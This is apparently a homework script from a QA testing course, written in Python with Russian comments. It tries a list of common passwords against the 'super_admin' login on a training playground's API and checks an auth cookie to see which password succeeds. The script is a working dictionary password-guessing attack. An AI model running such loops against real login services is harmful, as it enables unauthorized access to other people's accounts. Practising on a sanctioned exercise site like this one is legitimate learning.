import requests
# Значения Top 25 most common passwords by year according to SplashData без дублей
lib_pas=('password' , '123456' , '12345678' , 'qwerty' , 'abc123' , 'monkey' , '1234567' , 'letmein' , 'trustno1' ,
         'dragon' , 'baseball' , '111111' , 'iloveyou' , 'master' , 'sunshine' , 'ashley' , 'bailey' , 'passw0rd' ,
         'shadow' , '123123' , '654321' , 'superman' , 'qazwsx' , 'michael' , 'Football' , 'welcome' , 'football' ,
         'jesus' , 'ninja' , 'mustang' , 'password1' , '123456789' , 'adobe123' , 'admin' , '1234567890' , 'photoshop' ,
         '1234' , '12345' , 'princess' , 'azerty' , 'access' , '696969' , 'batman' , 'login' , 'solo' , '121212' ,
         'flower' , 'hottie' , 'loveme' , 'zaq1zaq1' , '666666' , '!@#$%^&*' , 'charlie' , 'aa123456' , 'donald' ,
         'qwerty123' , '1qaz2wsx' , 'qwertyuiop' , 'starwars' , 'hello' , 'freedom' , 'whatever' , '1q2w3e4r' ,
         '555555' , 'lovely' , '7777777' , '888888' , '123qwe' , '000000')
j=1 #Флаг, если цикл переберёт все значения и нее найдёт пароля,то сообщим об этом
for i in lib_pas:
    payload = {"login": "super_admin", "password": i}
    resp=requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    cookie_v = resp.cookies.get("auth_cookie")
    cookies = {"auth_cookie": cookie_v}
    resp=requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if resp.text != 'You are NOT authorized':
        print(resp.text)
        print(f"Ваш пароль: {i}")
        j=0
        break #раз нашли пароль выходим из цикла
if j:
    print("Пароля нет в списке")
